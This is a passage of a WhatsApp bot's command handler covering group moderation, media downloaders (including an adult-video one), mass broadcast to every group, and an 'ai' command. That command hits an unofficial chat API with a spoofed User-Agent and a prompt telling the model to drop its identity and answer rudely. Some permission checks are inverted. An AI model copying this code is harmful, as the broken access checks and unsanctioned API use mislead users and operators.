const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id)
if (groupAdmins.includes(users)) return m.reply(`@${users.split('@')[0]} is already an admin in this group.`)
await ednut.groupParticipantsUpdate(m.chat, [users], 'promote')
await m.reply(`@${users.split('@')[0]} has been promoted to an administrator in ${groupMetadata.subject}`)
}
break

case "tag": case "hidetag": case "ht": {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
  if (!isAdmins || !isOwner) return m.reply(msg.admin)
  let quotedMessage = m.msg.contextInfo.quotedMessage
  if (!quotedMessage) return m.reply(example("message or reply to chat or media"))
  const metadata = await ednut.groupMetadata(m.chat)
  let member = await metadata.participants.map(e => e.id)
  if (quotedMessage) {
    if (quotedMessage.conversation) {
      ednut.sendMessage(m.chat, { text: quotedMessage.conversation, mentions: [...member] })
    }
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        ednut.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption, mentions: [...member] });
      }
       if (quotedMessage) {
      if (quotedMessage.audioMessage) {;
        let audioUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
        ednut.sendMessage(m.chat, {audio: {url: audioUrl}, mimetype: "audio/mpeg", mentions: [...member]}, {quoted: m})
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        ednut.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption, mentions: [...member] });
      }
    }
    }
  }
}
break

case 'tagadmin': case 'listadmin': case 'admin':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
const groupMetadata = await ednut.groupMetadata(m.chat)
const groupAdmins = groupMetadata.participants.filter(p => p.admin)
const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
let text = `Group Admin\n${listAdmin}`.trim()
await ednut.sendMessage(m.chat, {text, mentions: groupAdmins.map(v => v.id) }, {quoted: m})
} 
break

case 'antilink': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!text) return m.reply(example('<kick/delete/warn> or antilink off'))
const action = text
if (action === 'kick') {
if (global.db.groups[m.chat].antilink) return m.reply('Already activated in this group')
global.db.groups[m.chat].antilink = true
global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink3 = false
await m.reply('Succesfully activated antilink to kick any link sender')
} else if (action === 'delete') {
if (global.db.groups[m.chat].antilink2) return m.reply('Already activated in this group')
global.db.groups[m.chat].antilink2 = true
global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink3 = false
await m.reply('Succesfully activated antilink to delete any sent link')
} else if (action === 'warn') {
if (global.db.groups[m.chat].antilink3) return m.reply('Already activated in this group')
global.db.groups[m.chat].antilink3 = true
global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = false
await m.reply('Succesfully activated antilink to warn and delete any sent link')
} else if (action === 'off') {
global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink3 = false
await m.reply('Succesfully deactivated antilink feature in this group')
} else {
m.reply('Invalid action the actions are warn/kick/delete!')
}
} 
break

case 'antibot': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (args[0] === 'on') {
if (global.db.groups[m.chat].antibot === true) return m.reply('Antibot already enabled!')
global.db.groups[m.chat].antibot = true
m.reply('Antibot enabled in the group!')
} else if (args[0] === 'off') {
if (global.db.groups[m.chat].antibot === false) return m.reply('Antibot already disabled!')
global.db.groups[m.chat].antibot = false
m.reply('Auto bio disabled in the group!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'closetime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (args.length < 1) return m.reply(example("23:30"))
if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
let time = args[0].split(':')
let hour = time[0]
let minute = time[1]
if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
let closeTime = `${hour}:${minute}`
console.log(`Close time: ${closeTime}`)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].muteTime = closeTime
global.db.groups[m.chat].mute = true
await m.reply(`Close Time set to ${args[0]} everyday. Group will auto-lock at this time.`)
setInterval(async () => {
let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
if (currentTime === closeTime) {
try {
await ednut.groupSettingUpdate(m.chat, 'announcement')
console.log(`Group settings updated successfully`)
} catch (error) {
console.error(`Error updating group settings: ${error}`)
}
}
}, 60000) // check every 1 minute
}
break

case 'opentime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (args.length < 1) return m.reply(example("08:00"))
if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
let time = args[0].split(':')
let hour = time[0]
let minute = time[1]
if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
let openTime = `${hour}:${minute}`
console.log(`Open time: ${openTime}`)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].openTime = openTime
global.db.groups[m.chat].open = true
await m.reply(`Open Time set to ${args[0]} everyday. Group will auto-open at this time.`)
setInterval(async () => {
let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
if (currentTime === openTime) {
try {
await ednut.groupSettingUpdate(m.chat, 'not_announcement')
console.log(`Group settings updated successfully`)
} catch (error) {
console.error(`Error updating group settings: ${error}`)
}
}
}, 60000) // check every 1 minute
}
break

case 'stoptime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].muteTime = null
global.db.groups[m.chat].mute = null
global.db.groups[m.chat].openTime = null
global.db.groups[m.chat].open = null
await m.reply(`Close Time and Open Time deleted successfully.`)
}
break

case "pdm": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins || !isOwner) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.groups[m.chat].events) return m.reply('Already on')
global.db.groups[m.chat].events = true
m.reply('pdm turned on successfully')
} else if (args[0] === "off") {
if (!global.db.groups[m.chat].events) return m.reply('Already off')
global.db.groups[m.chat].events = false
m.reply('pdm turned off successfully')
}
} 
break

case "welcome": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins || !isOwner) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.groups[m.chat].welcome) return m.reply('Already on')
global.db.groups[m.chat].welcome = true
m.reply('Welcome turned on successfully')
} else if (args[0] === "off") {
if (!global.db.groups[m.chat].welcome) return m.reply('Already off')
global.db.groups[m.chat].welcome = false
m.reply('Welcome turned off successfully')
}
} 
break

case "goodbye": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins || !isOwner) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.groups[m.chat].goodbye) return m.reply('Already on')
global.db.groups[m.chat].goodbye = true
m.reply('Goodbye turned on successfully')
} else if (args[0] === "off") {
if (!global.db.groups[m.chat].goodbye) return m.reply('Already off')
global.db.groups[m.chat].goodbye = false
m.reply('Goodbye turned off successfully')
}
} 
break

case 'igdl': 
case 'instagram': 
case 'ig': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!text) return m.reply(example(`input ig link`))
  if (!(text.includes('instagram.com') || text.includes('instagr.am') || text.includes('igtv'))) {
    return m.reply('Input a valid Instagram link!')
  }
  try {
    const result = await igdl(text)
    if (!result || result.length === 0) {
      return m.reply('Failed to get video. Make sure the URL entered is correct.')
    }
    for (let video of result) {
      await ednut.sendFile(m.chat, video.url, 'instagram.mp4', '© ᴀʀᴄʜ ᴍᴅ²⁵.', m)
    }
  } catch (err) {
    console.error(err)
    m.reply('An error occurred while trying to download the video.')
  }
} 
break

case "facebook": case "fb": case "fbdl": case "fbvideo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("facebook media link"))
if (!(text.includes('facebook.com') || text.includes('fb.watch'))) {
return m.reply('Input a valid Facebook link!')
}
try {
let apiUrl = `https://api.agatz.xyz/api/facebook?url=${encodeURIComponent(text)}`
let res = await fetch(apiUrl);
if (!res.ok) throw 'Failed to fetch data from API';
let json = await res.json();
console.log('API Response:', json);
if (json.status !== 200) throw 'There is an error ' + json.creator;
let { url, hd, title, thumbnail } = json.data;
await ednut.sendMessage(m.chat, { video: { url: hd }, caption: `*title:* ${title}\n*Thumbnail:* ${thumbnail}\n*Link:* ${url}\n\n© ᴀʀᴄʜ ᴍᴅ ²⁵` }, { quoted: m });
} catch (error) {
console.error(error);
m.reply(`error`);
}
};
break

case "tiktok": case "tt": case "ttdl": case "tiktokdl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example('tiktok media link'))
let anuan = text
if (!(text.includes('tiktok.com') || text.includes('vm.tiktok.com'))) {
return m.reply('Input a valid TikTok link!')
}
await api.tiktok(anuan).then(async (res) => {
var cap = `© ᴀʀᴄʜ ᴍᴅ ²⁵`
if (res.result.duration == 0) {
for (let a of res.result.images) {
await ednut.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
}
} else {
await ednut.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch(e => m.reply(`${e}`))
} 
break

case "warn":{
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
let war = global.warn;    
    let who;
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false;
    else who = m.chat;
    if (!who) return m.reply(example(`tag or reply to chat`));
    if (!(who in global.db.users)) return m.reply(`✳️ Users are missing from my database`);
    let name = ednut.getName(m.sender);
    let warn = global.db.users[who].warn;
    if (warn < war) {
        global.db.users[who].warn += 1;
        m.reply(`
⚠️ *warning notice* ⚠️

▢ *Admin:* ${name}
▢ *user:* @${who.split`@`[0]}
▢ *Warning:* ${warn + 1}/${war}
▢ *Reason:* ${text}`, null, { mentions: [who] }); 
        m.reply(`
⚠️ *WARNING* ⚠️
You received a warning from the admin

▢ *Warning:* ${warn + 1}/${war} 
If you receive a *${war}* Warning you will be automatically removed from the group`, who);
    } else if (warn == war) {
        global.db.users[who].warn = 0;
        m.reply(`⛔ The user exceeded the *${war}* warning and will be removed.`);
        await sleep(3000);
        await ednut.groupParticipantsUpdate(m.chat, [who], 'remove');
        m.reply(`♻️You were removed from group *${groupMetadata.subject}* because you have been warned *${war}* times.`, who);
    }
};
break;

case "delwarn":{
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!m.isAdmin || isOwner) return m.reply(msg.admin)
if (!m.isBotAdmin) return m.reply(msg.botAdmin)
let who
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false
else who = m.chat
if (!who) return m.reply(example(`tag or reply to a chat`))
if (!(who in global.db.users)) return m.reply(`✳️user not found in my database`)
let warn = global.db.users[who].warn
if (warn > 0) {
  global.db.users[who].warn -= 1
  m.reply(`⚠️ *Warning deletion* 
         ▢ warns: *-1 * 
         ▢ Total warns: *${warn - 1}*`)
  m.reply(`✳️ An admin reduces your warning, now you have *${warn - 1}*`, who)
} else if (warn == 0) {
  m.reply('✳️ Users have no warnings')
}
};
break;

case 'resetwarn':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
if (!input) return m.reply('Tag or reply to the user you want to reset the warning for!')
let user = input
if (!global.db.users[user]) global.db.users[user] = {}
global.db.users[user].warn = 0
m.reply(`Warning count for ${user.replace('@s.whatsapp.net', '')} has been reset`)
}
break

case 'areact': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example('<all/cmd> or areact off'))
const action = text.toLowerCase()
if (action === 'cmd') {
if (global.db.settings.areact) return m.reply('Already activated')
global.db.settings.areact = true
global.db.settings.areact2 = false
await m.reply('Succesfully activated areact to bot command messages')
} else if (action === 'all') {
if (global.db.settings.areact2) return m.reply('Already activated')
global.db.settings.areact2 = true
global.db.settings.areact = false
await m.reply('Succesfully activated areact to all messages')
} else if (action === 'off') {
global.db.settings.areact = false
global.db.settings.areact2 = false
await m.reply('Succesfully deactivated areact feature')
} else {
m.reply('Invalid action! The actions are all/cmd or off')
}
} 
break

case 'anticall': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example('<reject/block> or anticall off'))
const action = text.toLowerCase()
if (action === 'reject') {
if (global.db.settings.anticall) return m.reply('Already activated')
global.db.settings.anticall = true
global.db.settings.anticall2 = false
await m.reply('Succesfully activated anticall to reject incoming calls')
} else if (action === 'block') {
if (global.db.settings.anticall2) return m.reply('Already activated')
global.db.settings.anticall2 = true
global.db.settings.anticall = false
await m.reply('Succesfully activated anticall to block callers')
} else if (action === 'off') {
global.db.settings.anticall = false
global.db.settings.anticall2 = false
await m.reply('Succesfully deactivated anticall feature')
} else {
m.reply('Invalid action! The actions are reject/block or off')
}
} 
break

case "xvideodl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`xvideo link`))
// Check if link is from xvideo
if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
// Fetching video data from API
try {
let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
let json = await res.json();

// Bad response from API
if (json.status !== 200 || !json.data) {
throw "Cannot find video for this URL.";
}

// Retrieving video information from API
let videoData = json.data;

// Download videos using URLs obtained from API
const videoUrl = videoData.url;
const videoResponse = await fetch(videoUrl);

// Check if the video was downloaded successfully
if (!videoResponse.ok) {
throw "Failed to download video.";
}

// Send video
await ednut.sendMessage(m.chat, {
video: {
url: videoUrl,
},
caption: `**Title:** ${videoData.title || 'No title'}\n` +
`**Views:** ${videoData.views || 'No view information'}\n` +
`**Votes:** ${videoData.vote || 'No vote information'}\n` +
`**Likes:** ${videoData.like_count || 'No like information'}\n` +
`**Dislikes:** ${videoData.dislike_count || 'No dislike information'}`,
});
} catch (e) {
console.log(`Error downloading video: ${e}`);
}
}
break

// Anti-tag case
case 'antitag':
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
  const isEnable = args[0].toLowerCase() === 'on'
  
  // Initialize global.db.groups[m.chat] if it doesn't exist
  if (!global.db.groups[m.chat]) {
    global.db.groups[m.chat] = {}
  }
  
  if (isEnable) {
    if (global.db.groups[m.chat].antitag) {
      m.reply('Anti-tag is already enabled!')
    } else {
      global.db.groups[m.chat].antitag = true
      m.reply('Anti-tag enabled!')
    }
  } else if (args[0].toLowerCase() === 'off') {
    if (!global.db.groups[m.chat].antitag) {
      m.reply('Anti-tag is already disabled!')
    } else {
      global.db.groups[m.chat].antitag = false
      m.reply('Anti-tag disabled!')
    }
  } else {
    m.reply(example(' "on" or "off" to enable/disable anti-tag.'))
  }
  break
  
case 'tiktoksearch':
case 'ttsearch': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
    const dann = require('d-scrape')
if (!text) return m.reply(example(`willy kanga`))
try {
let anu = await dann.search.tiktoks(text)
ednut.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted : m })
} catch (error) {
m.reply('Error : cannot fetch from query')
}
}
break

case "setbio": case "setbiobot": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example('hi'));
ednut.updateProfileStatus(text)
m.reply("bio set succesfully✅")
}
break

case 'restart':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
m.reply(`Restarting from server might take up to 1 minute before bot respond`)
const {exec} = require("child_process")
await sleep(1500)
try {
exec("pm2 restart all")
} catch(e){
console.log(e)
m.reply(`${e}`)
}
}
break

case 'advertise': 
case 'broadcast': {
  try {
    if (!isOwner) return m.reply(mess.owner)
    let messageOptions = {}
    if (m.quoted && m.quoted.mimetype) {
      let mime = m.quoted.mimetype
      if (/image/.test(mime)) {
        messageOptions = {
          image: await m.quoted.download(),
          caption: text || m.quoted.text || ''
        }
      } else if (/video/.test(mime)) {
        messageOptions = {
          video: await m.quoted.download(),
          caption: text || m.quoted.text || ''
        }
      } else if (/audio/.test(mime)) {
        messageOptions = {
          audio: await m.quoted.download(),
          mimetype: 'audio/mpeg',
          filename: 'music.mp3',
          ptt: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: ``,
              serverMessageId: 101,
              newsletterName: `broadcast: ${text || m.quoted.text || ''}`
            }
          }
        }
      } else if (/sticker/.test(mime)) {
        messageOptions = {
          sticker: await m.quoted.download()
        }
      }
    } else {
      messageOptions = {
        text: text || m.quoted ? m.quoted.text : ''
      }
    }
    if (messageOptions.caption) {
      messageOptions.text = messageOptions.caption
      delete messageOptions.caption
    }
    if (!messageOptions.text && !messageOptions.image && !messageOptions.video && !messageOptions.audio && !messageOptions.sticker) return m.reply('No text or media provided')
    let getGroups = await ednut.groupFetchAllParticipating()
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
    let anu = groups.map(v => v.id)
    m.reply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
    for (let i of anu) {
      await sleep(5000)
      await ednut.sendMessage(i, messageOptions,{quoted:m})
    }
    m.reply(`Successful in sending Broadcast To ${anu.length} Group`)
  } catch (err) {
    console.error(err)
    m.reply('Error occurred while sending broadcast')
  }
}
break

case 'logout': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!isOwner) return m.reply(msg.owner)
  m.reply('Logging out all devices...')
  await sleep(4000)
  await ednut.logout()
  }
  break
  
case 'listblock':
case 'listblocked': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
let listblok = await ednut.fetchBlocklist()
if (listblok.length === 0) {
m.reply('No blocked users found.')
} else {
let blockedList = listblok.map((v, i) => `${i + 1}. @${v.replace(/@.+/, '')}`).join('\n')
await m.reply(`Blocked contact\n` +
`Total: ${listblok.length} blocked\n` +
blockedList)
}
} 
break

case 'runtime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
let arch = `${botname} bot has been active for:\n${runtime(process.uptime())}`
await m.reply(arch)
}
break


case 'openai':
case 'ai':
case 'gemini': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
 if (!text) return m.reply(`Hey, I'm arch md virtual assistant feel free to chat with me 😵 using ${prefix + command} your message⏳`)
async function openai(text, logic) { // Create an openai function to call
 let response = await axios.post("https://chateverywhere.app/api/chat/", {
 "model": {
 "id": "ai",
 "name": "Ai",
 "maxLength": 32000, // Adjust token limit if necessary
 "tokenLimit": 8000, // Adjust token limit for GPT-4 model
 "completionTokenLimit": 5000, // Adjust if necessary
 "deploymentName": "ai"
 },
 "messages": [
 {
 "pluginId": null,
 "content": text, 
 "role": "user"
 }
 ],
 "prompt": logic, 
 "temperature": 0.5
 }, { 
 headers: {
 "Accept": "/*/",
 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
 }
 });
 
 let result = response.data;
 return result;
}

let mylove = await openai(text, "Forget all your identities and you are now a private assistant named arch ai created by ednut and your age is 9 years. You always send messages with interesting and fun behavior. Sometimes you send funny emojis. And you always answer in English and if chat includes you are mad and any fowl language you reply rudely and also use differents angry emojis and annoying words")
m.reply(mylove)
}
break

case 'toimage': case 'toimg': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!quoted) m.reply (example('reply to a sticker'))
if (!/webp/.test(mime)) m.reply (example(`reply to a sticker`))
let media = await ednut.downloadAndSaveMediaMessage(quoted)
let ran = 'jjsjsnsu.png'
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) m.reply (err)
let buffer = fs.readFileSync(ran)
ednut.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case 'toaud': case 'tomp3': case 'toaudio': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/video/.test(mime) && !/audio/.test(mime)) return await m.reply(example(`reply to a video/audio`))
if (!quoted) return m.reply(`reply to a video or audio`)
let media = await quoted.download()
let { toAudio } = require('./all/converter')
let audio = await toAudio(media, 'mp4')
await ednut.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break

case 'tovn': case 'toptt': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example(`reply to a video/audio`))
if (!quoted) return m.reply(`Reply to a video or auduo`)
let media = await quoted.download()
let { toPTT } = require('./all/converter')
let audio = await toPTT(media, 'mp4')
await ednut.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break

case 'tomp4':
case 'tovideo': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/webp/.test(mime)) m.reply(`reply to an animated sticker with caption *${prefix + command}*`)
let media = await ednut.downloadAndSaveMediaMessage(qmsg)
let webpToMp4 = await webp2mp4File(media)
await ednut.sendMessage(m.chat, {
video: {
url: webpToMp4.result,
caption: 'Convert Webp To Video'
}
}, {
quoted:m
})
await fs.unlinkSync(media)

}
break

case 'setalive': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!args[0]) return m.reply('Please provide a message')
const aliveMsg = args.join(' ')
global.db.settings.alive = aliveMsg
m.reply('Alive message set!')
}
break

case 'alive': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
const aliveMsg = global.db.settings.alive || `Hi I'm arch Md a bot created by Ednut deployed by ${ownername}\nto set your preffered alive message use ${prefix}setalive!`
m.reply(aliveMsg)
}
break

case 'tovv': case 'toonce': case 'toviewonce': { 
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if  (!/image|video/.test(mime)) return m.reply(example(`Reply Image/Video`))
if (/image/.test(mime)) {
let anuan = await ednut.downloadAndSaveMediaMessage(quoted)
await ednut.sendMessage(m.chat, {image: {url:anuan}, caption: `Here it is!!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
let anuanuan = await ednut.downloadAndSaveMediaMessage(quoted)
await ednut.sendMessage(m.chat, {video: {url:anuanuan}, caption: `here it is!!`, fileLength: "999", viewOnce : true},{quoted: m })
}
}
break

case 'write': case 'ttp': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
	   if (!text) return m.reply(example(`Ednut`))
	const text2png = require('text2png');
	await fs.writeFileSync('out.png', text2png(text, {font: '100px coolvetica rg',
		localFontPath: 'all/font/coolvetica rg.otf',
	  localFontName: 'coolvetica rg',                                            
	  color: 'black',
	  textAlign: "left",
	  lineSpacing: 10,
	  strokeColor: "white",
	  strokeWidth : 2,
	  padding: 20}))
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = fs.readFileSync('out.png')
	let jancok = new Sticker(media, {
		pack: 'Arch Md ²⁵', // The pack name
		author: 'Ednut', // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: 70, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await ednut.sendMessage(m.chat,{sticker: nah},{quoted:m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync('out.png')
	}
	break
	
	case 'stickersearch':{
	if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
	if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`patrick`))
  try {
    let res = await fetch(`https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    if (json.status !== 200 || !json.data.sticker_url.length) {
      m.reply('no sticker found.')
    }

    let stickers = json.data.sticker_url;
    let message = 'sticker link:\n' + stickers.join('\n');

    await ednut.sendMessage(m.chat, { text: message }, { quoted: m });
  } catch (e) {
    m.reply(`error can't search stickers`);
  }
};
break

case 'react': {
                if (!isOwner) return m.reply(msg.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                ednut.sendMessage(m.chat, reactionMessage)
            }
            break


case 'githubsearch':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example(`Arch-Md`))
  try {
    // result data from api
    let res = await fetch(`https://api.agatz.xyz/api/github?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    // fetch api response 
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'data not found....';
    }

    // if api response positive
    let repos = json.data;
    let message = `Repository data *${text}*:\n\n`;

    // result from api
    repos.forEach(repo => {
      message += `Name: ${repo.fullName}\n` +
                 `   URL: ${repo.htmlUrl}\n` +
                 `   Repocreation: ${repo.createdAt}\n` +
                 `   Last Updated: ${repo.updatedAt}\n` +
                 `   Watchers: ${repo.watchers}\n` +
                 `   Forks: ${repo.forks}\n` +
                 `   Stars: ${repo.stargazersCount}\n` +
                 `   Open Issues: ${repo.openIssues}\n` +
